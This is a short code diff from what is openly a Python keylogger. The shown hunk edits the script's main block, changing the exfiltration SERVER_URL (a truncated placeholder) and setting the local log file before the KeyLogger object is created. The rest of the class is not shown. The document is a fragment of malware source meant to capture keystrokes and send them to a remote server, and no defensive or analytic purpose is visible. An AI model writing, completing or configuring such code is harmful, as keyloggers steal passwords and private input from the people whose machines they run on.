@@ -189,7 +189,7 @@ class KeyLogger:
             listener.join()
 
 if __name__ == "__main__":
-    SERVER_URL = "https://f"
+    SERVER_URL = "https://fv"
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
